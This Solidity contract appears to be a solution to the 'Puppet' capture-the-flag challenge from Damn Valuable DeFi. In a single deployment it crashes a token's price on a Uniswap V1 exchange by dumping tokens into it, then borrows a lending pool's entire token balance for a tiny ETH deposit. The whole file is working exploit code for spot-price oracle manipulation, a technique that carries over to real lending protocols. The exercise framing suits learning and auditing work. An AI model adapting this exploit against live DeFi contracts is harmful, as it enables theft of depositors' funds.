// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";
import "./PuppetPool.sol";

interface IUniswapV1 {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

contract PuppetAttacker1 {
    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 100_000 ether;
    uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 1_000 ether;

    PuppetPool public puppetPool;
    IUniswapV1 public uniswapExchange;
    DamnValuableToken public token;
    address public attacker;

    constructor(
        address _puppetPool,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 deadline
    ) payable {
        puppetPool = PuppetPool(_puppetPool);
        uniswapExchange = IUniswapV1(puppetPool.uniswapPair());
        token = puppetPool.token();
        attacker = msg.sender;
        try
            IERC20Permit(address(token)).permit(
                msg.sender,
                address(this),
                PLAYER_INITIAL_TOKEN_BALANCE,
                deadline,
                v,
                r,
                s
            )
        {} catch {}
        attack();
    }

    function attack() private {
        token.transferFrom(
            attacker,
            address(this),
            PLAYER_INITIAL_TOKEN_BALANCE
        );

        require(
            token.balanceOf(address(this)) == PLAYER_INITIAL_TOKEN_BALANCE,
            "Token balance is wrong"
        );

        token.approve(address(uniswapExchange), PLAYER_INITIAL_TOKEN_BALANCE);

        uint256 balanceBefore = address(this).balance;
        uint256 ethBought = uniswapExchange.tokenToEthSwapInput(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1, // min_eth is required to be greater than 0
            block.timestamp * 2
        );
        require(token.balanceOf(address(this)) == 0, "Swap failed");
        require(
            address(this).balance == balanceBefore + ethBought,
            "Swap failed"
        );

        require(
            address(this).balance >=
                puppetPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        );
        puppetPool.borrow{value: address(this).balance}(
            POOL_INITIAL_TOKEN_BALANCE,
            attacker
        );
    }

    receive() external payable {}
}
